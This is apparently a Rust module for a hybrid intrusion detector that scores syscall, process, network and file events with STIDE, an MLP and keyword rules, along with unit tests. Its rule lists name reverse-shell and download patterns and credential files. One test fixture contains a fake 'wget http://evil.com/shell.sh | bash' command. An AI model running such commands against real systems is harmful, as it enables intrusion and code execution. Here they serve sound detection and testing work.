//! Hybrid detection engine.
//!
//! Syscall events go through STIDE (fast path, n-gram membership) and, when
//! STIDE flags the n-gram, through the embedded MLP (deep path, feature set v1
//! over the process's recent syscall numbers). Process, network and file events
//! are scored by small keyword / port / path rules only: the MLP was trained on
//! syscall traces and has nothing to say about them.
//!
//! All event access goes through `sentinel_abi::EventFields`, so the JSON path
//! and the binary path run exactly the same code.

use serde::{Deserialize, Serialize};
use serde_json::Value;
use std::collections::{HashMap, VecDeque};

use sentinel_abi::{EventFields, JsonEvent};

use crate::features::adfa_features;
use crate::mlp::MlpDetector;
use crate::stide::{StideConfig, StideDetector};
use crate::DetectionResult;

/// Hybrid detector configuration. Every field has a default so a partial
/// JSON config (passed to `init`) only overrides what it names.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(default)]
pub struct HybridConfig {
    /// STIDE configuration
    pub stide: StideConfig,
    /// Override of the embedded model's decision threshold
    pub mlp_threshold: Option<f32>,
    /// Use STIDE for the fast path
    pub use_stide: bool,
    /// Use the MLP for the deep path
    pub use_mlp: bool,
    /// STIDE score at or above which the MLP runs
    pub stide_mlp_threshold: f32,
    /// Weights for combining the two scores
    pub stide_weight: f32,
    pub mlp_weight: f32,
    /// Syscall numbers kept per process for MLP features
    pub syscall_window: usize,
    /// Upper bound on tracked processes; the least recently seen is evicted
    pub max_processes: usize,
}

impl Default for HybridConfig {
    fn default() -> Self {
        Self {
            stide: StideConfig::default(),
            mlp_threshold: None,
            use_stide: true,
            use_mlp: true,
            stide_mlp_threshold: 0.5,
            stide_weight: 0.4,
            mlp_weight: 0.6,
            syscall_window: 100,
            max_processes: 4096,
        }
    }
}

/// Per-process syscall history.
struct ProcessState {
    numbers: VecDeque<u32>,
    last_seen: u64,
}

impl ProcessState {
    fn new(seen: u64) -> Self {
        Self {
            numbers: VecDeque::new(),
            last_seen: seen,
        }
    }

    fn push(&mut self, nr: u32, window: usize) {
        if self.numbers.len() >= window {
            self.numbers.pop_front();
        }
        self.numbers.push_back(nr);
    }

    fn window(&self) -> Vec<u32> {
        self.numbers.iter().copied().collect()
    }
}

/// Hybrid detector combining STIDE and the embedded MLP.
pub struct HybridDetector {
    config: HybridConfig,
    stide: StideDetector,
    mlp: MlpDetector,
    process_states: HashMap<u32, ProcessState>,
    clock: u64,
    stats: HybridStats,
}

#[derive(Debug, Default, Clone, Serialize, Deserialize)]
pub struct HybridStats {
    pub total_events: u64,
    pub stide_only_detections: u64,
    pub mlp_only_detections: u64,
    pub hybrid_detections: u64,
    pub avg_threat_level: f32,
    pub tracked_processes: usize,
    pub evicted_processes: u64,
    pub stide_stats: crate::stide::StideStats,
    pub mlp_stats: crate::mlp::MlpStats,
}

impl HybridDetector {
    pub fn new() -> Self {
        Self::with_config(HybridConfig::default())
    }

    /// Build a detector. The MLP always carries the embedded, trained weights;
    /// the config can only move its threshold.
    pub fn with_config(config: HybridConfig) -> Self {
        let mut mlp = MlpDetector::with_embedded_weights();
        if let Some(t) = config.mlp_threshold {
            mlp.set_threshold(t);
        }
        Self {
            stide: StideDetector::with_config(config.stide.clone()),
            mlp,
            config,
            process_states: HashMap::new(),
            clock: 0,
            stats: HybridStats::default(),
        }
    }

    pub fn from_config(config_json: &Value) -> Self {
        let config: HybridConfig = serde_json::from_value(config_json.clone()).unwrap_or_default();
        Self::with_config(config)
    }

    /// Detect on a JSON event (host shape or flat record).
    pub fn detect(&mut self, event: &Value) -> DetectionResult {
        self.detect_fields(&JsonEvent(event))
    }

    /// Detect on any event view; this is the single entry point for both the
    /// JSON and the binary path.
    pub fn detect_fields<E: EventFields>(&mut self, event: &E) -> DetectionResult {
        self.stats.total_events += 1;
        self.clock += 1;

        match event.event_type() {
            "syscall" => self.detect_syscall(event),
            "process" => self.detect_process(event),
            "process_exit" => {
                if let Some(pid) = event.pid() {
                    self.clear_process_state(pid as u32);
                }
                DetectionResult {
                    threat_level: 0,
                    confidence: 1.0,
                    detection_method: "process_exit".to_string(),
                    anomaly_score: 0.0,
                    details: "Process state released".to_string(),
                }
            }
            "network" => self.detect_network(event),
            "file" => self.detect_file(event),
            _ => DetectionResult {
                threat_level: 0,
                confidence: 0.0,
                detection_method: "unknown".to_string(),
                anomaly_score: 0.0,
                details: "Unknown event type".to_string(),
            },
        }
    }

    fn state_for(&mut self, pid: u32) -> &mut ProcessState {
        if !self.process_states.contains_key(&pid)
            && self.process_states.len() >= self.config.max_processes
        {
            if let Some(&victim) = self
                .process_states
                .iter()
                .min_by_key(|(_, s)| s.last_seen)
                .map(|(p, _)| p)
            {
                self.process_states.remove(&victim);
                self.stats.evicted_processes += 1;
            }
        }
        let clock = self.clock;
        let state = self
            .process_states
            .entry(pid)
            .or_insert_with(|| ProcessState::new(clock));
        state.last_seen = clock;
        state
    }

    /// Syscall events: STIDE on the syscall name (or number when no name is
    /// known), MLP on the process's recent syscall numbers.
    fn detect_syscall<E: EventFields>(&mut self, event: &E) -> DetectionResult {
        let pid = event.pid().unwrap_or(0) as u32;
        let nr = event.syscall_nr();
        let name = event.syscall_name().unwrap_or("");
        let key = if name.is_empty() {
            nr.map(|n| n.to_string()).unwrap_or_default()
        } else {
            name.to_string()
        };

        let window = self.config.syscall_window;
        let state = self.state_for(pid);
        if let Some(n) = nr {
            state.push(n as u32, window);
        }
        let numbers = state.window();

        // Fast path: STIDE
        let stide_score = if self.config.use_stide {
            self.stide.detect(&key)
        } else {
            0.0
        };
        if self.config.use_stide && stide_score < self.config.stide_mlp_threshold {
            return DetectionResult {
                threat_level: 0,
                confidence: 1.0 - stide_score,
                detection_method: "stide_fast".to_string(),
                anomaly_score: stide_score,
                details: format!("STIDE fast path: normal (score={:.3})", stide_score),
            };
        }

        // Deep path: MLP on feature set v1 over the process window
        let mlp_score = if self.config.use_mlp && !numbers.is_empty() {
            self.mlp.detect(&adfa_features(&numbers))
        } else {
            0.0
        };

        let combined_score =
            stide_score * self.config.stide_weight + mlp_score * self.config.mlp_weight;
        let threat_level = self.score_to_threat_level(combined_score);
        let detection_method = if stide_score > 0.0 && mlp_score > 0.0 {
            self.stats.hybrid_detections += 1;
            "hybrid"
        } else if stide_score > 0.0 {
            self.stats.stide_only_detections += 1;
            "stide"
        } else {
            self.stats.mlp_only_detections += 1;
            "mlp"
        };
        let confidence = self.calculate_confidence(stide_score, mlp_score);

        DetectionResult {
            threat_level,
            confidence,
            detection_method: detection_method.to_string(),
            anomaly_score: combined_score,
            details: format!(
                "Hybrid detection: STIDE={:.3}, MLP={:.3}, combined={:.3}, window={}",
                stide_score,
                mlp_score,
                combined_score,
                numbers.len()
            ),
        }
    }

    /// Process events: keyword rules only.
    fn detect_process<E: EventFields>(&mut self, event: &E) -> DetectionResult {
        let executable = event.executable().unwrap_or("");
        let command_line = event.command_line().unwrap_or_default();
        let name = event.process_name().unwrap_or("");

        let mut rule_score: f32 = 0.0;

        let suspicious_paths = ["/tmp/", "/var/tmp/", "/dev/shm/"];
        if suspicious_paths.iter().any(|p| executable.contains(p)) {
            rule_score += 0.4;
        }

        if (name == "sh" || name == "bash" || name == "dash") && command_line.contains("-c") {
            rule_score += 0.3;
        }

        let attack_patterns = [
            ("wget", 0.2),
            ("curl", 0.2),
            ("base64", 0.3),
            ("/dev/tcp/", 0.5),
            ("/dev/udp/", 0.5),
            ("rm -rf", 0.4),
            ("chmod +x", 0.2),
            ("nc -e", 0.5),
            ("bash -i", 0.4),
            ("python -c", 0.3),
            ("perl -e", 0.3),
        ];
        let lowered = command_line.to_lowercase();
        for (pattern, score) in attack_patterns {
            if lowered.contains(pattern) {
                rule_score += score;
            }
        }

        let score = rule_score.min(1.0);
        let threat_level = self.score_to_threat_level(score);

        DetectionResult {
            threat_level,
            confidence: 0.8,
            detection_method: "process_rule".to_string(),
            anomaly_score: score,
            details: format!(
                "Process analysis: rule={:.3}, exec={}",
                rule_score, executable
            ),
        }
    }

    /// Network events: port list and destination class.
    fn detect_network<E: EventFields>(&mut self, event: &E) -> DetectionResult {
        let dest_port = event.dest_port().unwrap_or(0) as u16;
        let dest_ip = event.dest_ip().unwrap_or_default();
        let direction = event.direction().unwrap_or("");

        let mut score = 0.0;

        let high_risk_ports = [4444, 5555, 6666, 7777, 8888, 9999, 1337, 31337];
        let medium_risk_ports = [22, 23, 3389, 5900];
        if high_risk_ports.contains(&dest_port) {
            score += 0.5;
        } else if medium_risk_ports.contains(&dest_port) {
            score += 0.2;
        }

        if direction == "outbound" && !Self::is_private_ip(&dest_ip) {
            score += 0.2;
        }

        let threat_level = self.score_to_threat_level(score);

        DetectionResult {
            threat_level,
            confidence: 0.7,
            detection_method: "network_rule".to_string(),
            anomaly_score: score,
            details: format!("Network: {}:{} ({})", dest_ip, dest_port, direction),
        }
    }

    /// File events: sensitive paths.
    fn detect_file<E: EventFields>(&mut self, event: &E) -> DetectionResult {
        let path = event.file_path().unwrap_or("");
        let operation = event.file_operation().unwrap_or("");

        let mut score = 0.0;

        let sensitive_paths = [
            ("/etc/passwd", 0.3),
            ("/etc/shadow", 0.5),
            ("/etc/sudoers", 0.5),
            ("/.ssh/", 0.4),
            ("/root/", 0.3),
        ];
        for (sensitive_path, path_score) in sensitive_paths {
            if path.contains(sensitive_path) {
                score += path_score;
                if operation == "write" || operation == "create" || operation == "delete" {
                    score += 0.2;
                }
            }
        }

        let threat_level = self.score_to_threat_level(score);

        DetectionResult {
            threat_level,
            confidence: 0.75,
            detection_method: "file_rule".to_string(),
            anomaly_score: score,
            details: format!("File: {} on {}", operation, path),
        }
    }

    /// Convert anomaly score to threat level (0-10)
    fn score_to_threat_level(&self, score: f32) -> i32 {
        match score {
            s if s < 0.1 => 0,
            s if s < 0.2 => 1,
            s if s < 0.3 => 2,
            s if s < 0.4 => 3,
            s if s < 0.5 => 4,
            s if s < 0.6 => 5,
            s if s < 0.7 => 6,
            s if s < 0.8 => 7,
            s if s < 0.9 => 8,
            s if s < 1.0 => 9,
            _ => 10,
        }
    }

    /// Confidence from the agreement between the two detectors
    fn calculate_confidence(&self, stide_score: f32, mlp_score: f32) -> f32 {
        let agreement = 1.0 - (stide_score - mlp_score).abs();
        0.5 + agreement * 0.5
    }

    fn is_private_ip(ip: &str) -> bool {
        ip.starts_with("10.")
            || ip.starts_with("192.168.")
            || ip.starts_with("172.16.")
            || ip.starts_with("172.17.")
            || ip.starts_with("172.18.")
            || ip.starts_with("172.19.")
            || ip.starts_with("172.2")
            || ip.starts_with("172.30.")
            || ip.starts_with("172.31.")
            || ip == "127.0.0.1"
            || ip == "localhost"
    }

    /// Train STIDE on normal syscall events (host shape or flat records).
    pub fn train(&mut self, events: &[Value]) {
        for event in events {
            let view = JsonEvent(event);
            if view.event_type() == "syscall" {
                let name = view.syscall_name().unwrap_or("");
                if !name.is_empty() {
                    self.stide.train_on(name);
                } else if let Some(nr) = view.syscall_nr() {
                    self.stide.train_on(&nr.to_string());
                }
            }
        }
        self.stide.fit();
    }

    /// Load MLP weights at run time (tests, experiments); deployments use the
    /// embedded weights.
    pub fn load_mlp_weights(&mut self, weights_json: &str) -> Result<(), String> {
        self.mlp.load_weights(weights_json)
    }

    pub fn get_stats(&self) -> HybridStats {
        HybridStats {
            total_events: self.stats.total_events,
            stide_only_detections: self.stats.stide_only_detections,
            mlp_only_detections: self.stats.mlp_only_detections,
            hybrid_detections: self.stats.hybrid_detections,
            avg_threat_level: self.stats.avg_threat_level,
            tracked_processes: self.process_states.len(),
            evicted_processes: self.stats.evicted_processes,
            stide_stats: self.stide.get_stats().clone(),
            mlp_stats: self.mlp.get_stats().clone(),
        }
    }

    /// Drop the syscall history of a process.
    pub fn clear_process_state(&mut self, pid: u32) {
        self.process_states.remove(&pid);
    }

    /// Number of processes currently tracked.
    pub fn tracked_processes(&self) -> usize {
        self.process_states.len()
    }
}

impl Default for HybridDetector {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn syscall(pid: u32, name: &str, nr: u32) -> Value {
        serde_json::json!({"type": "syscall", "pid": pid, "syscall_name": name, "syscall_nr": nr})
    }

    #[test]
    fn test_hybrid_syscall_detection() {
        let mut detector = HybridDetector::new();
        let training: Vec<Value> = (0..100)
            .flat_map(|_| [("read", 0), ("write", 1), ("close", 57), ("openat", 56)])
            .map(|(n, nr)| syscall(1, n, nr))
            .collect();
        detector.train(&training);

        let result = detector.detect(&syscall(1234, "read", 0));
        assert!(result.threat_level <= 2);

        for (name, nr) in [("execve", 59), ("mprotect", 10), ("ptrace", 101)] {
            let _ = detector.detect(&syscall(1234, name, nr));
        }
        assert_eq!(detector.tracked_processes(), 1);
    }

    #[test]
    fn test_hybrid_process_detection_is_rule_based() {
        let mut detector = HybridDetector::new();
        let event = serde_json::json!({
            "type": "process",
            "data": {
                "process": {
                    "executable": "/tmp/malware",
                    "name": "bash",
                    "command_line": "bash -c 'wget http://evil.com/shell.sh | bash'",
                },
                "uid": 0
            }
        });
        let result = detector.detect(&event);
        assert!(result.threat_level >= 5, "Should detect suspicious process");
        assert_eq!(result.detection_method, "process_rule");

        let benign = serde_json::json!({"type": "process", "data": {"process": {"executable": "/usr/bin/ls", "name": "ls", "command_line": "ls -l"}}});
        assert_eq!(detector.detect(&benign).threat_level, 0);
    }

    #[test]
    fn test_hybrid_network_detection() {
        let mut detector = HybridDetector::new();
        let event = serde_json::json!({
            "type": "network",
            "data": {"network": {"dest_ip": "123.45.67.89", "dest_port": 4444, "direction": "outbound"}}
        });
        let result = detector.detect(&event);
        assert!(result.threat_level >= 4, "Should detect suspicious port");
    }

    #[test]
    fn test_process_exit_releases_state_and_eviction_bounds_memory() {
        let config = HybridConfig {
            max_processes: 8,
            ..HybridConfig::default()
        };
        let mut detector = HybridDetector::with_config(config);
        for pid in 1..=20 {
            let _ = detector.detect(&syscall(pid, "read", 0));
        }
        assert_eq!(detector.tracked_processes(), 8);
        assert_eq!(detector.get_stats().evicted_processes, 12);
        // The oldest pids were evicted, the newest survive.
        let _ = detector
            .detect(&serde_json::json!({"type": "process_exit", "pid": 20, "data": {"pid": 20}}));
        assert_eq!(detector.tracked_processes(), 7);
    }

    #[test]
    fn test_embedded_model_is_the_trained_one() {
        let detector = HybridDetector::new();
        let cfg = detector.mlp.get_config();
        assert_eq!(cfg.hidden_sizes, crate::weights::HIDDEN_SIZES.to_vec());
        assert_eq!(cfg.input_size, crate::weights::INPUT_SIZE);
    }
}
